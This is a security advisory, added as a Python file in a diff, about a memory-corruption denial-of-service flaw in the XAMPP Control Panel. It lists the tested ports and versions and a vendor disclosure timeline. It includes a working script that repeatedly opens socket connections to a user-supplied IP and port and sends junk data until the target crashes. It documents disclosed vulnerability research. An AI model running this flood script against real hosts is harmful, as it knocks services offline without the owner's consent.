@@ -1,0 +1,149 @@
+'''
+[+] Credits: John Page (hyp3rlinx)
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/XAMPP-CONTROL-PANEL-MEMORY-CORRUPTION-DOS.txt
+
+[+] ISR: ApparitionSec
+
+
+
+Vendor:
+=====================
+www.apachefriends.org
+
+
+
+
+Product:
+===================
+XAMPP Control Panel
+
+
+XAMPP is a free and open source cross-platform web server solution stack
+package developed by Apache Friends,
+consisting mainly of the Apache HTTP Server, MariaDB database, and
+interpreters for scripts written in the PHP
+and Perl programming languages.
+
+
+
+Vulnerability Type:
+=====================
+Memory Corruption DOS
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+Vulnerability Details:
+=====================
+
+XAMPP Control Panel crashes with access violation when writing junk bytes
+into several different ports e.g.
+
+Tested following ports / versions:
+
+(MySQL) 3306 v3.2.2
+(Tomcat) 8080 (XAMPP v3.1.0)
+(FileZilla) 21
+(Mercury Mail) 25 (XAMPP v3.1.0),79,105,106,143.
+
+It is not that XAMPP Control Panel is listening on some port, however
+memory corruption and Denial Of Service does
+occur when you constantly write junk into, for instance, the MySQL, Tomcat,
+FileZilla, Mercury Mail listening ports.
+
+
+1) Launch XAMPP control panel
+2) Run exploit script against some ports like 3306, 79, 105 (Mercury mail)
+with Apache running and or Tomcat
+
+Target different services and port combinations to reproduce.
+
+Important to note is that neither MySQL or Apache itself crash, it IS the
+XAMPP Control Panel that crashes with Access Violation.
+
+
+Tested Windows SP1
+
+
+POC Video:
+https://vimeo.com/196938261
+
+
+Exploit code(s):
+===============
+'''
+
+import socket
+
+print "XAMPP Control Panel DOS"
+print "Discovery: John Page (hyp3rlinx)"
+print "ApparitionSec"
+print "hyp3rlinx.altervista.org\r\n"
+
+IP = raw_input("[IP]> ")
+PORT = raw_input("[PORT]> ")
+
+arr=[]
+c=0
+while 1:
+    try:
+        arr.append(socket.create_connection((IP,PORT)))
+        arr[c].send("DOOM")
+        print "Die!"
+        c+=1
+    except socket.error:
+        print "[+] Done! "
+        raw_input()
+        break
+
+
+
+'''
+Disclosure Timeline:
+=======================================
+Vendor Notification: November 1, 2016
+Vendor acknowledgement: November 4, 2016
+Vendor released Fix : December 22, 2016
+(NO public mention as of the time of this writing)
+December 24, 2016  : Public Disclosure
+
+
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+
+Severity Level:
+================
+High
+
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the
+information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author
+prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+hyp3rlinx
+'''
